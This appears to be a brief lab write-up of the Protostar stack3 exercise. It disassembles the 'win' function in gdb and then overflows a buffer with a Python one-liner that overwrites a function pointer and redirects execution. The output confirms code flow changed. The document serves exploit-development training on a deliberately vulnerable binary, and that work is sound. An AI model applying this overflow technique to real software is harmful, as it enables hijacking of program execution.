## protostar-stack3

function pointer overwrite may lead us to any function

## 

```sh

$ gdb ./stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) disas win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   %ebp----------------------------------------------------------------->this address!
0x08048425 <win+1>:     mov    %esp,%ebp
0x08048427 <win+3>:     sub    $0x18,%esp
0x0804842a <win+6>:     movl   $0x8048540,(%esp)
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
(gdb) q

$ python -c 'print "A"*64+"\x24\x84\x04\x08"' |./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
$


```